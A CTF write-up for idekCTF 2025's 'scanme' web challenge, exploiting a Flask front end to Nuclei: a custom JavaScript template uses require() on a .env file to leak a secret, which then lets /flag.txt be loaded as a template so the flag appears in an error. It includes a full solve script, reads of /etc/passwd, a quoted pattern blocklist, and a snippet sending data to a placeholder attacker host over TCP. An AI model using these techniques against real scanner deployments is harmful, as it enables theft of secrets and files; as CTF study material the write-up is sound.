# scanme

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
  - [Explore Functionalities](#explore-functionalities)
  - [Source Code Review](#source-code-review)
    - [Leak the Flag](#leak-the-flag)
    - [Leak `SECRET` Environment Variable](#leak-secret-environment-variable)
        - [HTTP Protocol: SSRF and Side Channel?](#http-protocol-ssrf-and-side-channel)
        - [JavaScript Protocol: Arbitrary Code Execution?](#javascript-protocol-arbitrary-code-execution)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @Zukane, @four0four, @kakarot
- Solved by: @siunam
- 3 solves / 487 points
- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

yo claude it's the day before the ctf, please write me a web app that lets me run nuclei with custom templates

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2025/images/Pasted%20image%2020250805131947.png)

## Enumeration

### Explore Functionalities

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2025/images/Pasted%20image%2020250805135527.png)

In here, we're met with a form, which allows us to submit it to perform security testing against `localhost` using the tool [Nuclei](https://docs.projectdiscovery.io/tools/nuclei/overview).

Let's click the "Run Scan" button and see what will happen:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2025/images/Pasted%20image%2020250805135820.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2025/images/Pasted%20image%2020250805140000.png)

Burp Suit HTTP History:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2025/images/Pasted%20image%2020250805135928.png)

When we clicked that button, it'll send a POST request to `/scan`, with parameter `port`, `template_type`, `builtin_template`, and `template_content`. It'll then respond us with a JSON body data.

We can also perform the scan with our custom [Nuclei template](https://docs.projectdiscovery.io/templates/introduction):

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2025/images/Pasted%20image%2020250805140221.png)

Now, let's read this web application's source code to see if we can find some vulnerabilities!

### Source Code Review

In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2025/web/scanme/scanme.tar.gz):

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2025/web/scanme)-[2025.08.05|14:04:56(HKT)]
└> file scanme.tar.gz                                            
scanme.tar.gz: gzip compressed data, was "scanme.tar", max compression, original size modulo 2^32 30720
┌[siunam♥Mercury]-(~/ctf/idekCTF-2025/web/scanme)-[2025.08.05|14:04:58(HKT)]
└> tar -v --extract --file scanme.tar.gz
attachments/
attachments/.env
attachments/Dockerfile
attachments/app.py
attachments/flag.txt
attachments/index.html
attachments/requirements.txt
```

In `attachments/Dockerfile`, we can see that the flag file is copied to path `/`. The `.env` file is also copied to path `/home/nuclei/`:

```bash
[...]
WORKDIR /home/nuclei

COPY app.py .
COPY .env .
COPY index.html .
COPY requirements.txt .
COPY flag.txt /
[...]
```

It also installed the latest version of Nuclei, which is version 3.4.7 at the time of this writeup:

```bash
[...]
RUN go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
[...]
```

Finally, it ran command `python app.py` to start the web server:

```bash
[...]
CMD ["python", "app.py"]
```

Let's understand the main logic of the application, `attachments/app.py`!

In this application, it only has 2 routes, which are GET route `/` and POST route `/scan`. Since GET route `/` just sends the static HTML file `index.html` to the client, we'll dive deeper into POST route `/scan`.

First, it'll convert our parameter `port` from string to integer, and check if the port number is within a valid port number range:

```python
from flask import Flask, send_file, request, jsonify
[...]
app = Flask(__name__)
[...]
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        port = request.form.get('port', '80')
        template_type = request.form.get('template_type', 'builtin')
        
        # Validate port
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                raise ValueError()
        except ValueError:
            return jsonify({'success': False, 'error': 'Invalid port number'})
        [...]
    except subprocess.TimeoutExpired:
        [...]
    except Exception as e:
        [...]
```

Then, it'll build the following nuclei command:

```python
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        # Build target URL (localhost only)
        target = f"http://127.0.0.1:{port}"
        
        # Build Nuclei command
        cmd = ['nuclei', '-target', target, '-jsonl', '--no-color']
        [...]
    [...]
```

Which will be `nuclei -target http://127.0.0.1:<port> -jsonl --no-color`. Unfortunately, it converts our `port` number into an integer, so we can't set the `-target` option to be any URL, such as `http://127.0.0.1:@attacker.com`.

Next, if our parameter `template_type` is string `custom`, it'll validate our custom template's content (Parameter `template_content`) by calling function `validate_template`:

```python
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        if template_type == 'custom':
            template_content = request.form.get('template_content', '').strip()
            [...]
            # Validate custom template
            is_valid, validation_msg = validate_template(template_content)
            if not is_valid:
                return jsonify({'success': False, 'error': f'Template validation failed: {validation_msg}'})
            [...]
        else:
            [...]
    [...]
```

In that function, it'll first parse and deserialize our custom template content using library [PyYAML](https://pypi.org/project/PyYAML/):

```python
import yaml
[...]
def validate_template(template_content):
    """Validate Nuclei template YAML structure"""
    try:
        template = yaml.safe_load(template_content)
        
        # Basic validation
        if not isinstance(template, dict):
            return False, "Template must be a YAML object"
            
        if 'id' not in template:
            return False, "Template must have an 'id' field"
            
        if 'info' not in template:
            return False, "Template must have an 'info' field"
        [...]
    except yaml.YAMLError as e:
        return False, f"Invalid YAML: {str(e)}"
```

After that, it checks the parsed and deserialized template must be a YAML object. As well as having an `id` and an `info` field.

Notably, it uses [function `safe_load`](https://pyyaml.org/wiki/PyYAMLDocumentation) instead of function `load` to parse our YAML data, which only accepts standard YAML tags and can't construct an arbitrary Python object. If it uses function `load`, it's vulnerable to [YAML insecure deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/python-yaml-deserialization.html).

Next, it checks our template matches following regular expression (regex) pattern or not:

```python
import re
[...]
def validate_template(template_content):
    """Validate Nuclei template YAML structure"""
    try:
        [...]
        # Check for potentially dangerous operations
        dangerous_patterns = [
            r'exec\s*:',
            r'shell\s*:',
            r'command\s*:',
            r'file\s*:.*\.\./\.\.',
        ]
        
        template_str = str(template_content).lower()
        for pattern in dangerous_patterns:
            if re.search(pattern, template_str):
                return False, f"Template contains potentially dangerous operations: {pattern}"
        
        return True, "Template is valid"
    except yaml.YAMLError as e:
        return False, f"Invalid YAML: {str(e)}"
```

If the template matches the following patterns, this function will return `False`, which will not pass the validation checks:
- `exec<space_characters>:`
- `shell<space_characters>:`
- `command<space_characters>:`
- `file<space_characters>:<any_characters>../..`

Otherwise, the function will return `True`, which means the template is valid.

After this validation, it'll write a temporary file to `/tmp/<random_characters>.yaml` with our template call [function `NamedTemporaryFile` from library tempfile](https://docs.python.org/3/library/tempfile.html#tempfile.NamedTemporaryFile). This temporary file will not be deleted after creation, because argument `delete` is set to `False`:

```python
import tempfile
[...]
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        if template_type == 'custom':
            [...]
            # Save custom template to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
                f.write(template_content)
                template_file = f.name
            
            cmd.extend(['-t', template_file])
        else:
            [...]
    [...]
```

It'll finally [extend](https://docs.python.org/3/tutorial/datastructures.html) the command list with `-t <temporary_filename>`.

But what if our `template_type` is not `custom`?

Well, if our header `X-Secret` is NOT equal to the one in the environment variable `SECRET`, and our parameter `builtin_template` is one of the following whitelisted values, the command list will be extended with `-t <builtin_template>`:

```python
import os
[...]
from dotenv import load_dotenv
[...]
load_dotenv()
[...]
SECRET = os.environ.get("SECRET", "secret")
[...]
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        if template_type == 'custom':
            [...]
        else:
            # Use built-in templates
            builtin_template = request.form.get('builtin_template', 'http/misconfiguration')
            admin_secret = request.headers.get('X-Secret')

            if admin_secret != SECRET and builtin_template not in [
                    "http/misconfiguration",
                    "http/technologies",
                    "http/vulnerabilities",
                    "ssl",
                    "dns"
                    ]:
                return jsonify({
                    'success': False,
                    'error': 'Only administrators may enter a non-allowlisted template.'
                })

            cmd.extend(['-t', builtin_template])
    [...]
```

What's interesting in here is that if we *somehow* know the `SECRET`'s value, we can choose whatever template file.

After building the command, it'll run it using [library subprocess's function `run`](https://docs.python.org/3/library/subprocess.html#subprocess.run) and delete the temporary template file if `template_type` is `custom` and variable `template_file` is in the function `scan`'s local scope using [builtin function `locals`](https://docs.python.org/3/library/functions.html#locals):

```python
import subprocess
[...]
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        # Run Nuclei scan
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        # Clean up temporary file if it exists
        if template_type == 'custom' and 'template_file' in locals():
            try:
                os.unlink(template_file)
            except OSError:
                pass
        [...]
    [...]
```

After that, if the Nuclei process's [exit code](https://en.wikipedia.org/wiki/Exit_status) is `0` (Success) or has data in [standard output (stdout)](https://en.wikipedia.org/wiki/Standard_streams#Standard_output_(stdout)), it'll parse the output with a JSON parser and format it. The data should be in JSON format due to the `-jsonl` flag in the command.

```python
import json
[...]
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        # Process results
        if result.returncode == 0 or result.stdout:
            output_lines = []
            
            if result.stdout.strip():
                # Parse JSON output
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            finding = json.loads(line)
                            formatted_finding = f"""
🔍 Finding: {finding.get('info', {}).get('name', 'Unknown')}
📋 Template: {finding.get('template-id', 'N/A')}
🎯 Target: {finding.get('matched-at', 'N/A')}
⚠️  Severity: {finding.get('info', {}).get('severity', 'N/A')}
📝 Description: {finding.get('info', {}).get('description', 'N/A')}
🔗 Reference: {', '.join(finding.get('info', {}).get('reference', []))}
---"""
                            output_lines.append(formatted_finding)
                        except json.JSONDecodeError:
                            output_lines.append(f"Raw output: {line}")
            
            if not output_lines:
                output_lines.append("✅ No vulnerabilities or issues found.")
            [...]
    [...]
```

If there's some data in [standard error (stderr)](https://en.wikipedia.org/wiki/Standard_streams#Standard_error_(stderr)) in the process, it'll append the error message in the output:

```python
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        # Process results
        if result.returncode == 0 or result.stdout:
            [...]
            if result.stderr:
                output_lines.append(f"\n⚠️ Warnings/Errors:\n{result.stderr}")
            [...]
    [...]
```

After formatting the result, it'll return it as a JSON body data:

```python
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        # Process results
        if result.returncode == 0 or result.stdout:
            [...]
            return jsonify({
                'success': True,
                'output': '\n'.join(output_lines)
            })
    [...]
```

If the process's exit code is NOT `0`, it'll just return the error message in stderr as a JSON body data:

```python
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        # Process results
        if result.returncode == 0 or result.stdout:
            [...]
        else:
            error_msg = result.stderr if result.stderr else "Scan completed with no output"
            return jsonify({
                'success': False,
                'error': error_msg
            })
    [...]
```

Now that we have walk through the logic of POST route `/scan`, let's brainstorm what could go wrong or anything that seems to be weird.

In the selecting the template file's code, we noticed that there's a weird `X-Secret` header:

```python
@app.route('/scan', methods=['POST'])
def scan():
    try:
        [...]
        if template_type == 'custom':
            [...]
        else:
            # Use built-in templates
            builtin_template = request.form.get('builtin_template', 'http/misconfiguration')
            admin_secret = request.headers.get('X-Secret')

            if admin_secret != SECRET and builtin_template not in [
                    [...]
                    ]:
                return jsonify({
                    'success': False,
                    'error': 'Only administrators may enter a non-allowlisted template.'
                })

            cmd.extend(['-t', builtin_template])
    [...]
```

Hmm... Assume we know the value `SECRET`, we can control the template file's path! **Maybe we can try to use template `/flag.txt`??**

### Leak the Flag

To test this, we can build the Docker container locally:

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2025/web/scanme)-[2025.08.05|16:00:35(HKT)]
└> cd attachments 
┌[siunam♥Mercury]-(~/ctf/idekCTF-2025/web/scanme/attachments)-[2025.08.05|16:00:36(HKT)]
└> docker build . -t scanme:latest
[...]
```

Then, run the container, because we also need to run the server later on:

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2025/web/scanme/attachments)-[2025.08.05|16:03:28(HKT)]
└> docker run --rm -p 1337:1337 --name scanme scanme:latest
 * Serving Flask app 'app'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:1337
 * Running on http://172.17.0.2:1337
Press CTRL+C to quit

```

Next, get an interactive shell inside the container:

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2025/web/scanme)-[2025.08.05|16:04:05(HKT)]
└> docker exec -it scanme '/bin/bash'
nuclei@6c69356d0e5e:~$ 
```

Now, let's try to use template `/flag.txt` and see what will happen:

```shell
nuclei@6c69356d0e5e:~$ nuclei -target http://127.0.0.1:80 -jsonl --no-color -t /flag.txt
[...]
[ERR] Could not find template 'idek{REDACTED}': could not find file: open /home/nuclei/nuclei-templates/idek{REDACTED}: no such file or directory
[...]
```

Wait, what? **The template file's content is outputted into error message**?

Therefore, to leak the flag, we should *somehow* also **leak the `SECRET` environment variable**.

### Leak `SECRET` Environment Variable

Since we can run custom Nuclei template, maybe we could do that using some *feature* in the template?

In Nuclei template, it has something called "Protocol", which according to the [documentation](https://docs.projectdiscovery.io/templates/introduction), "they are designed to send targeted requests based on specific vulnerability". For instance, using the [DNS protocol](https://docs.projectdiscovery.io/templates/protocols/dns) to send and receive DNS requests/responses.

There are a total of 9 protocols. Let's go through them one by one.
- [HTTP protocol](https://docs.projectdiscovery.io/templates/protocols/http/basic-http): Sends HTTP requests
- [Headless protocol](https://docs.projectdiscovery.io/templates/protocols/headless): Using a [headless browser](https://developer.chrome.com/docs/chromium/headless) to visit different URLs, just like libraries [Puppeteer](https://pptr.dev/) in JavaScript, [Selenium](https://www.selenium.dev/) in Python.
- [Network protocol](https://docs.projectdiscovery.io/templates/protocols/network): Fancy [netcat](https://nmap.org/ncat/) binary, sends and receives raw TCP data
- DNS protocol: Explained previously
- [File protocol](https://docs.projectdiscovery.io/templates/protocols/file): Read local files
- [JavaScript protocol](https://docs.projectdiscovery.io/templates/protocols/javascript/introduction): Executes arbitrary JavaScript code in a sandboxed environment
- [Code protocol](https://docs.projectdiscovery.io/templates/protocols/code): Executes arbitrary code. I.e.: Python, Golang, Bash.
- [Flow protocol](https://docs.projectdiscovery.io/templates/protocols/flow): Allows conditionally execute requests and the orchestration of request execution
- [Multi-protocol](https://docs.projectdiscovery.io/templates/protocols/multi-protocol): Executes multiple protocols in a single template

Based on these protocols, some of them are interesting, such as headless protocol to read files using the [`file:` scheme](https://en.wikipedia.org/wiki/File_URI_scheme) (`file:///flag.txt`), file protocol to read arbitrary files, and more.

Unfortunately, some of them requires a flag in order to use them. For example, in the headless protocol, we must provide `-headless` flag, otherwise it can't be used:

```json
{
    "error": "[...]Excluded 1 headless template[s] (disabled as default), use -headless option to run headless templates.[...]",
    "success": false
}
```

After testing all of them, only **JavaScript protocol** and maybe HTTP protocol might be interesting and not disabled by default.

Hmm... Maybe we can somehow leak the environment variable using those protocols?

#### HTTP Protocol: SSRF and Side Channel?

Since we can send arbitrary HTTP requests using this protocol, maybe we can send a request to `file:///flag.txt` to read the file, and then exfiltrate it by leveraging [matcher](https://docs.projectdiscovery.io/templates/reference/matchers) to see if the file contains certain characters. Sadly, either sending a request to `file:///flag.txt` or redirecting the request to `file:///flag.txt` doesn't seem to work.

#### JavaScript Protocol: Arbitrary Code Execution?

According to the documentation, it has some built-in modules that can be imported. For instance, we can import the [`fs`](https://docs.projectdiscovery.io/templates/protocols/javascript/modules/fs) module to read files. With that said, let's try to read some files!

```yaml
id: anything

info:
  name: anything
  author: anything
  severity: info

javascript:
  - code: |
      const fs = require('nuclei/fs');
      const content = fs.ReadFileAsString('/etc/passwd');
```

If we run that custom template, it doesn't have any error/result.

Now, how can we exfiltrate the content of the file? We're just reading it and not outputting to the stdout/stderr.

Well, in JavaScript, we can use `console.log` to print out the value. Let's try that:

```javascript
const fs = require('nuclei/fs');
const content = fs.ReadFileAsString('/etc/passwd');
console.log(content);
```

> Note: There are many more ways to achieve the same goal. Including using [global function `log`](https://projectdiscovery.github.io/js-proto-docs/global.html#log) provided by Nuclei, and using module [`net`](https://docs.projectdiscovery.io/templates/protocols/javascript/modules/net) to send data to our attacker server:
> ```javascript
> const net = require('nuclei/net');
> const conn = net.Open("tcp", "<attacker_ip>:<attacker_port>");
> conn.Send('<data_here>');
> conn.Close();
> ```

If we run that again, it still don't have any output. Why?

If we run it with a verbose flag (`-v`), we can see this warning:

```shell
nuclei@f72b3012b71b:~$ cat << EOF > template.yaml 
> id: anything

info:
  name: anything
  author: anything
  severity: info

javascript:
  - code: |
      const fs = require('nuclei/fs');
      const content = fs.ReadFileAsString('/etc/passwd');
      console.log(content);
> EOF
nuclei@f72b3012b71b:~$ nuclei -target http://127.0.0.1:80 -jsonl --no-color -t template.yaml -v
[...]
[VER] [anything] Sent Javascript request to 127.0.0.1:80
[WRN] [anything] Could not execute request for http://127.0.0.1:80: [:RUNTIME] path /etc/passwd is outside nuclei-template directory and -lfa is not enabled
[...]
```

Hmm... "Path `/etc/passwd` is outside nuclei-template directory and `-lfa` is not enabled"??

If we read Nuclei's source code and search for error "is outside nuclei-template directory", we can find function `NormalizePath` at [`pkg/protocols/common/protocolstate/file.go` line 33](https://github.com/projectdiscovery/nuclei/blob/4190559e8d679d5636f268304aa1bcec72094750/pkg/protocols/common/protocolstate/file.go#L33):

```go
// Normalizepath normalizes path and returns absolute path
// it returns error if path is not allowed
// this respects the sandbox rules and only loads files from
// allowed directories
func NormalizePath(filePath string) (string, error) {
    if lfaAllowed {
        return filePath, nil
    }
    cleaned, err := fileutil.ResolveNClean(filePath, config.DefaultConfig.GetTemplateDir())
    if err != nil {
        return "", errorutil.NewWithErr(err).Msgf("could not resolve and clean path %v", filePath)
    }
    // only allow files inside nuclei-templates directory
    // even current working directory is not allowed
    if strings.HasPrefix(cleaned, config.DefaultConfig.GetTemplateDir()) {
        return cleaned, nil
    }
    return "", errorutil.New("path %v is outside nuclei-template directory and -lfa is not enabled", filePath)
}
```

And it's used by 2 functions in the `fs` module, [`ListDir`](https://docs.projectdiscovery.io/templates/protocols/javascript/modules/fs#listdir) and [`ReadFile`](https://docs.projectdiscovery.io/templates/protocols/javascript/modules/fs#readfile). Also, the other 2 functions in the `fs` module, [`ReadFileAsString`](https://docs.projectdiscovery.io/templates/protocols/javascript/modules/fs#readfileasstring) and [`ReadFilesFromDir`](https://docs.projectdiscovery.io/templates/protocols/javascript/modules/fs#readfilesfromdir) are function `ListDir` and `ReadFile` wrappers.

As we can see, if `lfaAllowed` is `false` and the path is outside the Nuclei template directory (By default is `$HOME/nuclei-templates`), it'll return an empty path.

Of course, if we provide the `-lfa` flag (local file access), we can see the file's content:

```shell
nuclei@f72b3012b71b:~$ nuclei -target http://127.0.0.1:80 -jsonl --no-color -t template.yaml -lfa
[...]
[INF] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
```

Hmm... Can we bypass that check? Unfortunately, we couldn't find a way to do so.

Maybe there's a built-in "arbitrary file read" in JavaScript? Well, the module importing feature, `require`!

At a very high-level overview, the importing statement will first read the given file. Then, parse it with a JavaScript parser.

With that said, we should be able to read arbitrary files, right?

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2025/web/scanme)-[2025.08.06|17:01:04(HKT)]
└> node
[...]
> require('/etc/passwd');
/etc/passwd:1
root:x:0:0:root:/root:/bin/bash
        ^

Uncaught SyntaxError: Unexpected token ':'
```

Well, of course, it parses the file with a JavaScript parser. Therefore, the file must be a valid JavaScript/JSON syntax.

> Note: JSON's syntax is very similar to JavaScript. That's why it's called "JavaScript Object" Notation.

With this in mind, maybe there's a JavaScript file in the local file system has some gadgets that allow us to read arbitrary files. Let's go find them!

```shell
nuclei@f72b3012b71b:~$ find / -type f -name "*.js" 2>/dev/null
/home/nuclei/nuclei-templates/helpers/payloads/CVE-2018-25031.js
/usr/local/lib/python3.11/site-packages/werkzeug/debug/shared/debugger.js
/usr/local/go/src/cmd/trace/static/webcomponents.min.js
[...]
```

Turns out, there are lots of JavaScript files. At the meantime, I wonder if the environment variable file at path `/home/nuclei/.env` is a valid JavaScript syntax or not:

```shell
nuclei@f72b3012b71b:~$ cat ~/.env 
PORT=1337
SECRET="REDACTED"
```

Wait a minute, it is a valid JavaScript syntax! Here's a more "readable" code:

```javascript
var PORT = 1337;
var SECRET = "REDACTED";
```

Therefore, we should be able to import it and print it out!

```javascript
require('/home/nuclei/.env');
console.log(SECRET);
```

```json
{
    "output": "\u2705 No vulnerabilities or issues found.\n\n\u26a0\ufe0f Warnings/Errors:\n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.4.7\n\n\t\tprojectdiscovery.io\n\n[INF] Current nuclei version: v3.4.7 (latest)\n[INF] Current nuclei-templates version: v10.2.6 (latest)\n[WRN] Scan results upload to cloud is disabled.\n[INF] New templates added in latest release: 41\n[INF] Templates loaded for current scan: 1\n[WRN] Loading 1 unsigned templates for scan. Use with caution.\n[INF] Targets loaded for current scan: 1\n[INF] REDACTED\n[INF] Scan completed in 132.73679ms. No results found.\n",
    "success": true
}
```

Wait, nothing?

Turns out, [Goja](https://github.com/dop251/goja), a library that implements ECMAScript 5.1 in Golang, doesn't have the context of [`globalThis`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/globalThis). To solve this issue, we can use the alternative, which is global function `log`:

```javascript
require('/home/nuclei/.env');
log(SECRET);
```

```json
{
    "output": "[...]REDACTED[...]",
    "success": true
}
```

Nice! It worked!

## Exploitation

Armed with above information, we can get the flag by:
1. Leak the `SECRET` environment variable via the JavaScript protocol
2. Leak the flag in the error message by using `/flag.txt` as the template file

To automate the above steps, I've written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests
import re

class Solver:
    NUCLEI_TEMPLATE = '''
id: anything

info:
  name: anything
  author: siunam
  severity: info

%s
'''

    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.FLAG_FILE_PATH = '/flag.txt'
        self.SECRET_REGEX_PATTERN = re.compile(r'\[[^\]]+\]\s+(.*)')
        self.FLAG_REGEX_PATTERN = re.compile(r'(idek{.*?})')

    def leakSecret(self):
        javaScriptProtocol = '''
javascript:
  - code: |
      require('/home/nuclei/.env');
      log(SECRET);
'''.strip()
        data = {
            'port': 80,
            'template_type': 'custom',
            'builtin_template': 'anything',
            'template_content': Solver.NUCLEI_TEMPLATE % javaScriptProtocol
        }
        print(f'[*] Leaking the `SECRET` environment variable with the following template:\n{data["template_content"]}')

        responseJson = requests.post(f'{baseUrl}/scan', data=data).json()
        secretMatch = self.SECRET_REGEX_PATTERN.search(responseJson['output'])
        if secretMatch is None:
            print('[-] Failed to leak the `SECRET` environment variable')
            exit()

        secret = secretMatch.group(1)
        print(f'[+] Leaked `SECRET` environment variable: {secret}')
        return secret

    def leakFlag(self, secret):
        print('[*] Leaking the flag...')
        data = {
            'port': 80,
            'template_type': 'anything',
            'builtin_template': self.FLAG_FILE_PATH,
            'template_content': 'anything'
        }
        header = { 'X-Secret': secret }
        responseJson = requests.post(f'{baseUrl}/scan', data=data, headers=header).json()
        flagMatch = self.FLAG_REGEX_PATTERN.search(responseJson['error'])
        if flagMatch is None:
            print('[-] Failed to leak the flag')
            exit()
        
        flag = flagMatch.group(1)
        print(f'[+] Flag: {flag}')

    def solve(self):
        secret = self.leakSecret()
        self.leakFlag(secret)

if __name__ == '__main__':
    # baseUrl = 'http://localhost:1337' # for local testing
    baseUrl = 'https://scanme-c25da7b0bc463f53.instancer.idek.team'

    solver = Solver(baseUrl)
    solver.solve()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2025/web/scanme)-[2025.08.06|19:28:19(HKT)]
└> python3 solve.py
[*] Leaking the `SECRET` environment variable with the following template:

id: anything

info:
  name: anything
  author: siunam
  severity: info

javascript:
  - code: |
      require('/home/nuclei/.env');
      log(SECRET);

[+] Leaked `SECRET` environment variable: 220dd99c96ed6d3724e13b3c808565c85e47a4489951241c
[*] Leaking the flag...
[+] Flag: idek{oops_nuclei_leaked_my_secret_and_now_i_am_very_sad_2e315d_:(}
```

- **Flag: `idek{oops_nuclei_leaked_my_secret_and_now_i_am_very_sad_2e315d_:(}`**

## Conclusion

What we've learned:

1. Dirty arbitrary file read via Nuclei template